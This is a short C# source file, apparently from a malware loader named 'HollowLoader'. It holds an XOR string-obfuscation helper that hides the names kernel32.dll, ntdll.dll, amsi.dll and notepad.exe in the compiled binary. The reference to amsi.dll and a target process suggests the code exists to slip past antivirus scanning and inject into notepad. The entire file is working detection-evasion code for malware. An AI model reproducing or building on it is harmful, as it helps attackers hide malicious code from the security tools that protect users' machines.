using System.Text;

namespace HollowLoader
{
    /// <summary>
    /// Runtime de-obfuscation of strings that are stored XOR-encrypted
    /// (UTF-16LE, single byte key) so plaintext module/process names never
    /// appear in the binary. Constants were generated with PayloadEncryptor.
    /// </summary>
    internal static class Obf
    {
        private const byte Key = 0x5A;

        internal static string Decrypt(byte[] enc)
        {
            byte[] buf = new byte[enc.Length];
            for (int i = 0; i < enc.Length; i++)
                buf[i] = (byte)(enc[i] ^ Key);
            return Encoding.Unicode.GetString(buf);
        }

        // "kernel32.dll"
        internal static readonly byte[] Kernel32DllEnc = {
            0x31, 0x5A, 0x3F, 0x5A, 0x28, 0x5A, 0x34, 0x5A, 0x3F, 0x5A, 0x36, 0x5A,
            0x69, 0x5A, 0x68, 0x5A, 0x74, 0x5A, 0x3E, 0x5A, 0x36, 0x5A, 0x36, 0x5A
        };

        // "ntdll.dll"
        internal static readonly byte[] NtdllDllEnc = {
            0x34, 0x5A, 0x2E, 0x5A, 0x3E, 0x5A, 0x36, 0x5A, 0x36, 0x5A, 0x74, 0x5A,
            0x3E, 0x5A, 0x36, 0x5A, 0x36, 0x5A
        };

        // "amsi.dll"
        internal static readonly byte[] AmsiDllEnc = {
            0x3B, 0x5A, 0x37, 0x5A, 0x29, 0x5A, 0x33, 0x5A, 0x74, 0x5A, 0x3E, 0x5A,
            0x36, 0x5A, 0x36, 0x5A
        };

        // "notepad.exe"
        internal static readonly byte[] NotepadExeEnc = {
            0x34, 0x5A, 0x35, 0x5A, 0x2E, 0x5A, 0x3F, 0x5A, 0x2A, 0x5A, 0x3B, 0x5A,
            0x3E, 0x5A, 0x74, 0x5A, 0x3F, 0x5A, 0x22, 0x5A, 0x3F, 0x5A
        };

        internal static string Kernel32Dll => Decrypt(Kernel32DllEnc);
        internal static string NtdllDll => Decrypt(NtdllDllEnc);
        internal static string AmsiDll => Decrypt(AmsiDllEnc);
        internal static string NotepadExe => Decrypt(NotepadExeEnc);
    }
}
